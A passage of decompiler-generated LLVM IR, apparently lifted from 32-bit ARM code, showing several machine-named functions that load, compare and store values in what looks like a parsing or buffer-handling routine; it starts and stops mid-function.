  %v2_e310 = add i32 %v1_e310, 12
  %v3_e310 = inttoptr i32 %v2_e310 to i32*
  store i32 %v3_e2f4, i32* %v3_e310, align 4
  %v0_e314 = load i32, i32* %r7.global-to-local, align 4
  %v1_e314 = add i32 %v0_e314, 4
  %v2_e314 = inttoptr i32 %v1_e314 to i32*
  %v3_e314 = load i32, i32* @r5, align 4
  store i32 %v3_e314, i32* %v2_e314, align 4
  %v4_e314 = add i32 %v0_e314, 8
  %v5_e314 = inttoptr i32 %v4_e314 to i32*
  %v6_e314 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v6_e314, i32* %v5_e314, align 4
  %v0_e318 = load i32, i32* %r3.global-to-local, align 4
  %v1_e318 = load i32, i32* %r7.global-to-local, align 4
  %v2_e318 = add i32 %v1_e318, 20
  %v3_e318 = inttoptr i32 %v2_e318 to i32*
  store i32 %v0_e318, i32* %v3_e318, align 4
  %v0_e31c = load i32, i32* %r2.global-to-local, align 4
  %v1_e31c = load i32, i32* %r7.global-to-local, align 4
  %v2_e31c = add i32 %v1_e31c, 16
  %v3_e31c = inttoptr i32 %v2_e31c to i32*
  store i32 %v0_e31c, i32* %v3_e31c, align 4
  %v0_e320 = load i32, i32* %r0.global-to-local, align 4
  %v1_e320 = load i32, i32* %r7.global-to-local, align 4
  %v2_e320 = add i32 %v1_e320, 28
  %v3_e320 = inttoptr i32 %v2_e320 to i32*
  store i32 %v0_e320, i32* %v3_e320, align 4
  %v0_e324 = load i32, i32* @ip, align 4
  %v1_e324 = inttoptr i32 %v0_e324 to i8*
  %v2_e324 = load i8, i8* %v1_e324, align 1
  %v3_e324 = zext i8 %v2_e324 to i32
  store i32 %v3_e324, i32* %r2.global-to-local, align 4
  %v2_e328 = icmp eq i8 %v2_e324, 0
  br i1 %v2_e328, label %dec_label_pc_e330, label %dec_label_pc_e348

dec_label_pc_e330:                                ; preds = %dec_label_pc_e2ec
  %v0_e330 = load i32, i32* %r6.global-to-local, align 4
  %v1_e330 = inttoptr i32 %v0_e330 to i8*
  %v2_e330 = load i8, i8* %v1_e330, align 1
  %v3_e330 = zext i8 %v2_e330 to i32
  store i32 %v3_e330, i32* %r3.global-to-local, align 4
  %v7_e334 = icmp eq i8 %v2_e330, 109
  br i1 %v7_e334, label %dec_label_pc_e33c, label %dec_label_pc_e44c

dec_label_pc_e33c:                                ; preds = %dec_label_pc_e330
  store i32 20, i32* %r3.global-to-local, align 4
  %v1_e340 = load i32, i32* %r7.global-to-local, align 4
  %v2_e340 = add i32 %v1_e340, 32
  %v3_e340 = inttoptr i32 %v2_e340 to i32*
  store i32 20, i32* %v3_e340, align 4
  %v0_e344 = load i32, i32* %r2.global-to-local, align 4
  %v1_e344 = load i32, i32* %r7.global-to-local, align 4
  %v2_e344 = add i32 %v1_e344, 28
  %v3_e344 = inttoptr i32 %v2_e344 to i32*
  store i32 %v0_e344, i32* %v3_e344, align 4
  br label %dec_label_pc_e348

dec_label_pc_e348:                                ; preds = %dec_label_pc_e2ec, %dec_label_pc_e33c
  %v0_e348 = load i32, i32* %sb.global-to-local, align 4
  %tmp141 = icmp slt i32 %v0_e348, 1
  br i1 %tmp141, label %dec_label_pc_e400, label %dec_label_pc_e350

dec_label_pc_e350:                                ; preds = %dec_label_pc_e348
  store i32 0, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_e354

dec_label_pc_e354:                                ; preds = %dec_label_pc_e3e8, %dec_label_pc_e350
  %v8_e370 = phi i32 [ 0, %dec_label_pc_e350 ], [ %v1_e3ec, %dec_label_pc_e3e8 ]
  %v7_e358 = icmp sgt i32 %v8_e370, 2
  br i1 %v7_e358, label %bb143, label %bb142

bb142:                                            ; preds = %dec_label_pc_e354
  store i32 %v25_dfb8, i32* %r2.global-to-local, align 4
  %v12_e35c = mul i32 %v8_e370, 4
  %v13_e35c = add i32 %v12_e35c, %v25_dfb8
  store i32 %v13_e35c, i32* %r3.global-to-local, align 4
  %v9_e360 = add i32 %v13_e35c, -24
  %v10_e360 = inttoptr i32 %v9_e360 to i32*
  %v11_e360 = load i32, i32* %v10_e360, align 4
  store i32 %v11_e360, i32* %r2.global-to-local, align 4
  %v9_e364 = load i32, i32* %r7.global-to-local, align 4
  %v10_e364 = add i32 %v9_e364, %v8_e370
  store i32 %v10_e364, i32* %r3.global-to-local, align 4
  %v9_e36c = trunc i32 %v11_e360 to i8
  %v11_e36c = add i32 %v10_e364, 36
  %v12_e36c = inttoptr i32 %v11_e36c to i8*
  store i8 %v9_e36c, i8* %v12_e36c, align 1
  %v8_e374 = load i32, i32* %r3.global-to-local, align 4
  %v9_e374 = add i32 %v8_e374, 36
  %v10_e374 = inttoptr i32 %v9_e374 to i8*
  %v11_e374 = load i8, i8* %v10_e374, align 1
  %v12_e374 = zext i8 %v11_e374 to i32
  br label %bb144

bb143:                                            ; preds = %dec_label_pc_e354
  %v10_e370 = add i32 %v8_e370, %stack_var_-48.3
  store i32 %v10_e370, i32* %r3.global-to-local, align 4
  %v9_e378 = add i32 %v10_e370, -2
  br label %bb144

bb144:                                            ; preds = %bb142, %bb143
  %v0_e39c = phi i32 [ %v12_e374, %bb142 ], [ %v9_e378, %bb143 ]
  store i32 %v0_e39c, i32* @r2, align 4
  %v1_e37c = load i32, i32* %sb.global-to-local, align 4
  %v2_e37c = sub i32 %v0_e39c, %v1_e37c
  %v4_e37c = xor i32 %v1_e37c, %v0_e39c
  %v5_e37c = xor i32 %v2_e37c, %v0_e39c
  %v6_e37c = and i32 %v5_e37c, %v4_e37c
  %v7_e37c = icmp slt i32 %v6_e37c, 0
  %v8_e37c = icmp slt i32 %v2_e37c, 0
  %v9_e37c = icmp eq i32 %v0_e39c, %v1_e37c
  %v3_e380 = xor i1 %v8_e37c, %v7_e37c
  %v4_e380 = or i1 %v9_e37c, %v3_e380
  br i1 %v4_e380, label %dec_label_pc_e390, label %dec_label_pc_e384

dec_label_pc_e384:                                ; preds = %bb144
  %v1_e384 = add i32 %v0_e39c, -9
  %v3_e384 = sub i32 8, %v0_e39c
  %v4_e384 = and i32 %v3_e384, %v0_e39c
  %v5_e384 = icmp slt i32 %v4_e384, 0
  %v6_e384 = icmp slt i32 %v1_e384, 0
  %v7_e384 = icmp eq i32 %v0_e39c, 9
  %v3_e388 = xor i1 %v6_e384, %v5_e384
  %v4_e388 = or i1 %v7_e384, %v3_e388
  br i1 %v4_e388, label %dec_label_pc_e38c, label %dec_label_pc_e44c

dec_label_pc_e38c:                                ; preds = %dec_label_pc_e384
  store i32 %v0_e39c, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_e390

dec_label_pc_e390:                                ; preds = %bb144, %dec_label_pc_e38c
  store i32 %v25_dfb8, i32* @ip, align 4
  %v1_e394 = load i32, i32* %r8.global-to-local, align 4
  %v4_e394 = mul i32 %v1_e394, 4
  %v5_e394 = add i32 %v4_e394, %v25_dfb8
  store i32 %v5_e394, i32* %r3.global-to-local, align 4
  %v1_e398 = add i32 %v5_e394, -12
  %v2_e398 = inttoptr i32 %v1_e398 to i32*
  %v3_e398 = load i32, i32* %v2_e398, align 4
  store i32 %v3_e398, i32* %r5.global-to-local, align 4
  %v1_e39c = add i32 %v0_e39c, -1
  store i32 %v1_e39c, i32* %sl.global-to-local, align 4
  %v0_e3a0 = load i32, i32* %r7.global-to-local, align 4
  %v4_e3a0 = mul i32 %v1_e39c, 4
  %v5_e3a0 = add i32 %v0_e3a0, %v4_e3a0
  store i32 %v5_e3a0, i32* %r3.global-to-local, align 4
  %v7_e3a4 = icmp eq i32 %v3_e398, 8
  %v1_e3a8 = add i32 %v5_e3a0, 40
  %v2_e3a8 = inttoptr i32 %v1_e3a8 to i32*
  %v3_e3a8 = load i32, i32* %v2_e3a8, align 4
  store i32 %v3_e3a8, i32* @r0, align 4
  br i1 %v7_e3a4, label %dec_label_pc_e3e8, label %dec_label_pc_e3b0

dec_label_pc_e3b0:                                ; preds = %dec_label_pc_e390
  %v9_e3b0 = icmp eq i32 %v3_e3a8, %v3_e398
  br i1 %v9_e3b0, label %dec_label_pc_e3d4, label %bb145

bb145:                                            ; preds = %dec_label_pc_e3b0
  %v8_e3b4 = icmp eq i32 %v3_e3a8, 8
  br i1 %v8_e3b4, label %dec_label_pc_e3d4, label %dec_label_pc_e3bc

dec_label_pc_e3bc:                                ; preds = %bb145
  %v0_e3bc = call i32 @function_df6c()
  %v0_e3c4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_e3c4, i32* @r0, align 4
  %v0_e3c8 = call i32 @function_df6c()
  store i32 %v0_e3c8, i32* %r0.global-to-local, align 4
  %v8_e3d0 = icmp sgt i32 %v0_e3bc, %v0_e3c8
  br i1 %v8_e3d0, label %dec_label_pc_e3e8, label %dec_label_pc_e3bc.dec_label_pc_e3d4_crit_edge

dec_label_pc_e3bc.dec_label_pc_e3d4_crit_edge:    ; preds = %dec_label_pc_e3bc
  %v1_e3d8.pre = load i32, i32* %r8.global-to-local, align 4
  %v0_e3e0.pre = load i32, i32* %r7.global-to-local, align 4
  %v1_e3e0.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_e3d4

dec_label_pc_e3d4:                                ; preds = %dec_label_pc_e3bc.dec_label_pc_e3d4_crit_edge, %dec_label_pc_e3b0, %bb145
  %v1_e3e0 = phi i32 [ %v1_e3e0.pre, %dec_label_pc_e3bc.dec_label_pc_e3d4_crit_edge ], [ %v1_e39c, %dec_label_pc_e3b0 ], [ %v1_e39c, %bb145 ]
  %v0_e3e0 = phi i32 [ %v0_e3e0.pre, %dec_label_pc_e3bc.dec_label_pc_e3d4_crit_edge ], [ %v0_e3a0, %dec_label_pc_e3b0 ], [ %v0_e3a0, %bb145 ]
  %v1_e3d8 = phi i32 [ %v1_e3d8.pre, %dec_label_pc_e3bc.dec_label_pc_e3d4_crit_edge ], [ %v1_e394, %dec_label_pc_e3b0 ], [ %v1_e394, %bb145 ]
  store i32 %v25_dfb8, i32* %r1.global-to-local, align 4
  %v4_e3d8 = mul i32 %v1_e3d8, 4
  %v5_e3d8 = add i32 %v4_e3d8, %v25_dfb8
  store i32 %v5_e3d8, i32* %r3.global-to-local, align 4
  %v1_e3dc = add i32 %v5_e3d8, -12
  %v2_e3dc = inttoptr i32 %v1_e3dc to i32*
  %v3_e3dc = load i32, i32* %v2_e3dc, align 4
  store i32 %v3_e3dc, i32* @r2, align 4
  %v4_e3e0 = mul i32 %v1_e3e0, 4
  %v5_e3e0 = add i32 %v4_e3e0, %v0_e3e0
  store i32 %v5_e3e0, i32* %r3.global-to-local, align 4
  %v2_e3e4 = add i32 %v5_e3e0, 40
  %v3_e3e4 = inttoptr i32 %v2_e3e4 to i32*
  store i32 %v3_e3dc, i32* %v3_e3e4, align 4
  br label %dec_label_pc_e3e8

dec_label_pc_e3e8:                                ; preds = %dec_label_pc_e3bc, %dec_label_pc_e390, %dec_label_pc_e3d4
  %v0_e3e8 = load i32, i32* %r7.global-to-local, align 4
  %v1_e3e8 = add i32 %v0_e3e8, 28
  %v2_e3e8 = inttoptr i32 %v1_e3e8 to i32*
  %v3_e3e8 = load i32, i32* %v2_e3e8, align 4
  %v0_e3ec = load i32, i32* %r8.global-to-local, align 4
  %v1_e3ec = add i32 %v0_e3ec, 1
  store i32 %v1_e3ec, i32* %r8.global-to-local, align 4
  %v1_e3f0 = add i32 %v3_e3e8, 2
  store i32 %v1_e3f0, i32* %r3.global-to-local, align 4
  %v6_e3f8 = icmp slt i32 %v1_e3ec, %v1_e3f0
  br i1 %v6_e3f8, label %dec_label_pc_e354, label %dec_label_pc_e418

dec_label_pc_e400:                                ; preds = %dec_label_pc_e348
  %v0_e400 = load i32, i32* %r7.global-to-local, align 4
  %v1_e400 = add i32 %v0_e400, 28
  %v2_e400 = inttoptr i32 %v1_e400 to i32*
  %v3_e400 = load i32, i32* %v2_e400, align 4
  store i32 %v3_e400, i32* %r2.global-to-local, align 4
  %v0_e404 = load i32, i32* %r0.global-to-local, align 4
  %v1_e404 = trunc i32 %v0_e404 to i8
  %v3_e404 = add i32 %v0_e400, 38
  %v4_e404 = inttoptr i32 %v3_e404 to i8*
  store i8 %v1_e404, i8* %v4_e404, align 1
  %v0_e408 = load i32, i32* %r2.global-to-local, align 4
  %v3_e408 = mul i32 %v0_e408, 4
  store i32 %v3_e408, i32* @r2, align 4
  %v0_e40c = load i32, i32* %r7.global-to-local, align 4
  %v1_e40c = add i32 %v0_e40c, 40
  store i32 %v1_e40c, i32* @r0, align 4
  %v2_e410 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_e410, i32* @r1, align 4
  %v0_e414 = call i32 @function_ec10()
  store i32 %v0_e414, i32* %r0.global-to-local, align 4
  %v0_e418.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_e418

dec_label_pc_e418:                                ; preds = %dec_label_pc_e3e8, %dec_label_pc_e400
  %v2_e434 = phi i32 [ %v0_e418.pre, %dec_label_pc_e400 ], [ %v0_e3e8, %dec_label_pc_e3e8 ]
  %v1_e418 = add i32 %v2_e434, 16
  %v2_e418 = inttoptr i32 %v1_e418 to i32*
  %v3_e418 = load i32, i32* %v2_e418, align 4
  store i32 %v3_e418, i32* %r3.global-to-local, align 4
  %v1_e41c = and i32 %v3_e418, 128
  %v2_e41c = icmp eq i32 %v1_e41c, 0
  br i1 %v2_e41c, label %.thread46, label %.thread44

.thread44:                                        ; preds = %dec_label_pc_e418
  store i32 %v2_dfc0, i32* %r3.global-to-local, align 4
  %v2_e424 = inttoptr i32 %v2_e434 to i32*
  %v3_e424 = load i32, i32* %v2_e424, align 4
  %v2_e42c.pre = load i32, i32* %r6.global-to-local, align 4
  %v3_e42c = sub i32 %v2_e42c.pre, %v2_dfc0
  store i32 %v3_e42c, i32* %r3.global-to-local, align 4
  %v5_e430 = mul i32 %v3_e42c, 4
  %v6_e430 = add i32 %v5_e430, %v3_e424
  store i32 %v6_e430, i32* @r2, align 4
  br label %bb146

.thread46:                                        ; preds = %dec_label_pc_e418
  %v1_e42841 = load i32, i32* %r6.global-to-local, align 4
  %v2_e42842 = add i32 %v1_e42841, 1
  store i32 %v2_e42842, i32* %r3.global-to-local, align 4
  %v3_e434 = inttoptr i32 %v2_e434 to i32*
  store i32 %v2_e42842, i32* %v3_e434, align 4
  %v0_e438.pre = load i32, i32* %r7.global-to-local, align 4
  br label %bb146

bb146:                                            ; preds = %.thread44, %.thread46
  %v1_e440 = phi i32 [ %v2_e434, %.thread44 ], [ %v0_e438.pre, %.thread46 ]
  %v1_e438 = add i32 %v1_e440, 28
  %v2_e438 = inttoptr i32 %v1_e438 to i32*
  %v3_e438 = load i32, i32* %v2_e438, align 4
  store i32 %v3_e438, i32* %r3.global-to-local, align 4
  %v1_e43c = add i32 %v3_e438, 2
  store i32 %v1_e43c, i32* %r0.global-to-local, align 4
  %v0_e440 = load i32, i32* %sb.global-to-local, align 4
  %v2_e440 = add i32 %v1_e440, 24
  %v3_e440 = inttoptr i32 %v2_e440 to i32*
  store i32 %v0_e440, i32* %v3_e440, align 4
  br i1 %v2_e41c, label %dec_label_pc_e450, label %bb147

bb147:                                            ; preds = %bb146
  %v1_e444 = load i32, i32* @r2, align 4
  %v2_e444 = load i32, i32* %r7.global-to-local, align 4
  %v3_e444 = inttoptr i32 %v2_e444 to i32*
  store i32 %v1_e444, i32* %v3_e444, align 4
  br label %dec_label_pc_e450

dec_label_pc_e44c:                                ; preds = %dec_label_pc_e008, %dec_label_pc_e114, %dec_label_pc_e1c4, %dec_label_pc_e198, %dec_label_pc_e1a4, %dec_label_pc_e0e4, %dec_label_pc_e384, %dec_label_pc_e330, %.thread25
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e450

dec_label_pc_e450:                                ; preds = %bb147, %bb146, %dec_label_pc_e44c
  %v2_e454 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_e454, i32* @r4, align 4
  store i32 %v6_dfb8, i32* @r5, align 4
  %v26_e454 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v26_e454

; uselistorder directives
  uselistorder i32 %v3_e42c, { 1, 0 }
  uselistorder i32 %v1_e3ec, { 1, 2, 0 }
  uselistorder i32 %v0_e3a0, { 1, 2, 0 }
  uselistorder i32 %v2_e37c, { 1, 0 }
  uselistorder i32 %v1_e37c, { 1, 0, 2 }
  uselistorder i32 %v0_e39c, { 3, 4, 5, 0, 7, 6, 9, 1, 2, 8, 10 }
  uselistorder i32 %v1_e2e0, { 1, 2, 0 }
  uselistorder i32 %v3_e2c8, { 1, 0 }
  uselistorder i32 %v3_e2c0, { 1, 0 }
  uselistorder i32 %v2_e2a0, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_e288, { 0, 2, 3, 1 }
  uselistorder i32 %v1_e26c, { 1, 0, 2 }
  uselistorder i32 %v3_e24c, { 2, 1, 0 }
  uselistorder i32 %v1_e210, { 0, 2, 3, 1 }
  uselistorder i32 %v2_e1e4, { 1, 0 }
  uselistorder i32 %v5_e144, { 0, 1, 3, 2 }
  uselistorder i32 %v0_e144, { 1, 0 }
  uselistorder i32 %storemerge105, { 1, 0, 4, 5, 2, 3 }
  uselistorder i32 %stack_var_-48.2, { 1, 0 }
  uselistorder i32 %v2_e0f0, { 1, 0 }
  uselistorder i32 %v0_e10c, { 3, 2, 0, 1, 4 }
  uselistorder i32 %v0_e0d4, { 2, 3, 4, 6, 0, 1, 5, 7 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i32 %v0_e0bc, { 2, 3, 4, 5, 0, 1, 6 }
  uselistorder i32 %v3_e0a8, { 1, 2, 0 }
  uselistorder i32 %v0_e120, { 1, 2, 3, 0, 4, 7, 5, 6 }
  uselistorder i32 %stack_var_-48.1, { 1, 2, 3, 0 }
  uselistorder i32 %v0_e05c, { 1, 0 }
  uselistorder i32 %v1_e02c, { 0, 2, 1 }
  uselistorder i32 %v25_dfb8, { 0, 8, 1, 9, 2, 7, 3, 10, 4, 5, 6 }
  uselistorder i32* %stack_var_-32, { 0, 2, 1 }
  uselistorder i32* %stack_var_-36, { 2, 0, 1 }
  uselistorder i32 %tmp, { 0, 2, 1, 3, 4 }
  uselistorder i32* %sb.global-to-local, { 4, 0, 5, 6, 7, 1, 2, 3, 8, 9 }
  uselistorder i32* %r8.global-to-local, { 0, 1, 3, 2, 4, 7, 6, 5, 8 }
  uselistorder i32* %r7.global-to-local, { 1, 16, 17, 2, 6, 3, 15, 4, 5, 7, 8, 9, 10, 11, 12, 13, 14, 0, 18 }
  uselistorder i32* %r6.global-to-local, { 9, 13, 10, 14, 3, 5, 11, 6, 7, 8, 0, 1, 2, 15, 4, 12 }
  uselistorder i32* %r3.global-to-local, { 3, 0, 11, 4, 5, 6, 7, 8, 9, 10, 12, 13, 14, 15, 17, 16, 1, 2, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 31, 30, 32, 33, 34, 35, 36, 37, 38, 41, 42, 43, 39, 40, 44, 45, 46, 47, 48, 49, 50 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 12, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 13, 14, 15, 11, 12, 0, 16 }
  uselistorder i32* %r0.global-to-local, { 3, 4, 2, 5, 7, 6, 8, 9, 10, 11, 12, 13, 20, 19, 14, 22, 15, 16, 17, 23, 18, 24, 25, 1, 26, 27, 28, 21, 0 }
  uselistorder i32 ()* @function_df6c, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_169a4.362 to i32), { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_169b4.360 to i32), { 1, 0, 2 }
  uselistorder i32 ptrtoint ([21 x i8]* @global_var_169d0.354 to i32), { 2, 1, 3, 0 }
  uselistorder i32 ptrtoint ([9 x i8]* @global_var_16990.352 to i32), { 1, 0, 2 }
  uselistorder i8 109, { 1, 0 }
  uselistorder i8 36, { 1, 0 }
  uselistorder i8 37, { 2, 3, 4, 1, 5, 0 }
  uselistorder label %dec_label_pc_e450, { 2, 0, 1 }
  uselistorder label %dec_label_pc_e44c, { 6, 7, 8, 2, 4, 3, 1, 5, 0 }
  uselistorder label %bb146, { 1, 0 }
  uselistorder label %dec_label_pc_e418, { 1, 0 }
  uselistorder label %dec_label_pc_e3e8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_e3d4, { 0, 2, 1 }
  uselistorder label %dec_label_pc_e390, { 1, 0 }
  uselistorder label %bb144, { 1, 0 }
  uselistorder label %dec_label_pc_e348, { 1, 0 }
  uselistorder label %bb137, { 2, 1, 0 }
  uselistorder label %.thread25, { 2, 0, 1 }
  uselistorder label %dec_label_pc_e1fc, { 1, 0 }
  uselistorder label %dec_label_pc_e1d4, { 1, 0 }
  uselistorder label %dec_label_pc_e184, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_e104, { 2, 0, 1 }
  uselistorder label %dec_label_pc_e100, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %.backedge, { 1, 0, 2 }
  uselistorder label %dec_label_pc_e060, { 1, 0 }
  uselistorder label %dec_label_pc_e050, { 1, 0 }
}

define i32 @function_e47c(i8* %arg1) local_unnamed_addr {
dec_label_pc_e47c:
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_e47c = load i32, i32* @r4, align 4
  store i32 %v3_e47c, i32* %stack_var_-16, align 4
  %v2_e480 = add i32 %tmp, 52
  %v3_e480 = inttoptr i32 %v2_e480 to i32*
  %v4_e480 = load i32, i32* %v3_e480, align 4
  store i32 %v4_e480, i32* %r6.global-to-local, align 4
  %v2_e488 = ptrtoint i32* %stack_var_-32 to i32
  %v2_e48c = icmp eq i32 %v4_e480, 0
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 %v2_e488, i32* @r0, align 4
  br i1 %v2_e48c, label %dec_label_pc_e4a4, label %dec_label_pc_e4c0

dec_label_pc_e4a4:                                ; preds = %dec_label_pc_e47c
  %v1_e4ac = call i32 @function_10840()
  %v1_e4bc = call i32 @function_10838()
  %v0_e4c0.pre = load i32, i32* %r4.global-to-local, align 4
  %v0_e4c8.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_e4c0

dec_label_pc_e4c0:                                ; preds = %dec_label_pc_e47c, %dec_label_pc_e4a4
  %v0_e4c8 = phi i32 [ %v4_e480, %dec_label_pc_e47c ], [ %v0_e4c8.pre, %dec_label_pc_e4a4 ]
  %v0_e4c0 = phi i32 [ %tmp, %dec_label_pc_e47c ], [ %v0_e4c0.pre, %dec_label_pc_e4a4 ]
  %v1_e4c0 = add i32 %v0_e4c0, 1
  %v2_e4c0 = inttoptr i32 %v1_e4c0 to i8*
  %v3_e4c0 = load i8, i8* %v2_e4c0, align 1
  %v4_e4c0 = zext i8 %v3_e4c0 to i32
  %v1_e4c4 = inttoptr i32 %v0_e4c0 to i8*
  %v2_e4c4 = load i8, i8* %v1_e4c4, align 1
  %v3_e4c4 = zext i8 %v2_e4c4 to i32
  %v2_e4c8 = icmp eq i32 %v0_e4c8, 0
  %v4_e4d4 = mul nuw nsw i32 %v4_e4c0, 256
  %v5_e4d4 = or i32 %v3_e4c4, %v4_e4d4
  store i32 %v5_e4d4, i32* %r4.global-to-local, align 4
  br i1 %v2_e4c8, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_e4c0
  call void @__pseudo_branch(i32 67648)
  %v0_e4e4.pre = load i32, i32* %r4.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_e4c0, %bb
  %v0_e4e4 = phi i32 [ %v5_e4d4, %dec_label_pc_e4c0 ], [ %v0_e4e4.pre, %bb ]
  %v1_e4e4 = and i32 %v0_e4e4, 4
  %v2_e4ec = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_e4ec, i32* %r4.global-to-local, align 4
  ret i32 %v1_e4e4

; uselistorder directives
  uselistorder i32 %v0_e4c0, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_e4c0, { 1, 0 }
}

define i32 @function_e500(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_e500:
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_e500 = load i32, i32* @r4, align 4
  store i32 %v3_e500, i32* %stack_var_-24, align 4
  %v6_e500 = load i32, i32* @r5, align 4
  %v9_e500 = load i32, i32* @r6, align 4
  %v12_e500 = load i32, i32* @r7, align 4
  %v1_e504 = add i32 %arg3, 52
  %v2_e504 = inttoptr i32 %v1_e504 to i32*
  %v3_e504 = load i32, i32* %v2_e504, align 4
  store i32 %v3_e504, i32* %r8.global-to-local, align 4
  %v2_e508 = ptrtoint i32* %stack_var_-40 to i32
  %v1_e50c = add i32 %arg3, 56
  store i32 %v1_e50c, i32* @r5, align 4
  %v2_e510 = icmp eq i32 %v3_e504, 0
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %v2_e508, i32* @r0, align 4
  br i1 %v2_e510, label %dec_label_pc_e530, label %dec_label_pc_e54c

dec_label_pc_e530:                                ; preds = %dec_label_pc_e500
  %v1_e538 = call i32 @function_10840()
  store i32 58700, i32* @lr, align 4
  %v1_e548 = call i32 @function_10838()
  %v0_e54c.pre = load i32, i32* @r6, align 4
  %v0_e550.pre = load i32, i32* @r4, align 4
  %v0_e554.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_e54c

dec_label_pc_e54c:                                ; preds = %dec_label_pc_e500, %dec_label_pc_e530
  %v0_e554 = phi i32 [ %arg1, %dec_label_pc_e500 ], [ %v0_e554.pre, %dec_label_pc_e530 ]
  %v0_e550 = phi i32 [ %arg3, %dec_label_pc_e500 ], [ %v0_e550.pre, %dec_label_pc_e530 ]
  %v0_e54c = phi i32 [ %arg2, %dec_label_pc_e500 ], [ %v0_e54c.pre, %dec_label_pc_e530 ]
  %v3_e558 = inttoptr i32 %v0_e554 to i8*
  %v4_e558 = call i32 @function_e984(i8* %v3_e558, i32 %v0_e54c, i32 %v0_e550)
  %v0_e55c = load i32, i32* %r8.global-to-local, align 4
  %v2_e55c = icmp eq i32 %v0_e55c, 0
  store i32 %v4_e558, i32* %r4.global-to-local, align 4
  br i1 %v2_e55c, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_e54c
  store i32 58744, i32* @lr, align 4
  call void @__pseudo_branch(i32 67648)
  %v0_e578.pre = load i32, i32* %r4.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_e54c, %bb
  %v0_e578 = phi i32 [ %v4_e558, %dec_label_pc_e54c ], [ %v0_e578.pre, %bb ]
  %v2_e580 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_e580, i32* @r4, align 4
  store i32 %v6_e500, i32* @r5, align 4
  store i32 %v9_e500, i32* @r6, align 4
  store i32 %v12_e500, i32* @r7, align 4
  ret i32 %v0_e578

; uselistorder directives
  uselistorder i32 %arg3, { 0, 1, 3, 2 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_e54c, { 1, 0 }
}

define i32 @function_e594(i8 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_e594:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %tmp = sext i8 %arg1 to i32
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_e594 = load i32, i32* @r4, align 4
  store i32 %v3_e594, i32* %stack_var_-16, align 4
  %v6_e594 = load i32, i32* @r5, align 4
  %v9_e594 = load i32, i32* @r6, align 4
  %v1_e598 = add i32 %arg2, 52
  %v2_e598 = inttoptr i32 %v1_e598 to i32*
  %v3_e598 = load i32, i32* %v2_e598, align 4
  %v1_e59c = add i32 %arg2, 56
  store i32 %v1_e59c, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e5a0 = icmp eq i32 %v3_e598, 0
  %v2_e5a4 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %arg2, i32* @r4, align 4
  store i32 %v1_e59c, i32* %r2.global-to-local, align 4
  store i32 %tmp, i32* @r5, align 4
  br i1 %v2_e5a0, label %dec_label_pc_e5e0, label %dec_label_pc_e5b8

dec_label_pc_e5b8:                                ; preds = %dec_label_pc_e594
  %v1_e5b8 = add i32 %arg2, 16
  %v2_e5b8 = inttoptr i32 %v1_e5b8 to i32*
  %v3_e5b8 = load i32, i32* %v2_e5b8, align 4
  store i32 %v3_e5b8, i32* %r2.global-to-local, align 4
  %v1_e5bc = add i32 %arg2, 28
  %v2_e5bc = inttoptr i32 %v1_e5bc to i32*
  %v3_e5bc = load i32, i32* %v2_e5bc, align 4
  %v3_e5c0 = icmp uge i32 %v3_e5b8, %v3_e5bc
  store i1 %v3_e5c0, i1* %cpsr_c.global-to-local, align 1
  br i1 %v3_e5c0, label %dec_label_pc_e5d4, label %bb

bb:                                               ; preds = %dec_label_pc_e5b8
  %v5_e5c4 = inttoptr i32 %v3_e5b8 to i8*
  store i8 %arg1, i8* %v5_e5c4, align 1
  %v0_e5c8.pr = load i1, i1* %cpsr_c.global-to-local, align 1
